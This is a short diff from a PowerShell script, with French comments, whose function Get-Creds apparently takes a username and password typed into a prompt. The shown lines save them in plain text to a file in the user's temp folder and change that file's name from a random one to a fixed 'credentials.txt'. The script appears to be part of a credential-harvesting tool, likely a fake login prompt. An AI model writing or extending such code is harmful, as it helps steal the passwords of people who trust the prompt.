@@ -120,7 +120,7 @@ function Get-Creds {
             }
             
             # Sauvegarder dans un fichier local
-            $filePath = "$env:TMP\creds_$(Get-Random).txt"
+            $filePath = "$env:TMP\credentials.txt"
             $credString = "Username: $($usernameBox.Text)`nPassword: $($passwordBox.Password)"
             $credString | Out-File -FilePath $filePath -Encoding UTF8 -Force
             Write-Host "Credentials sauvegardés dans: $filePath" -ForegroundColor Green
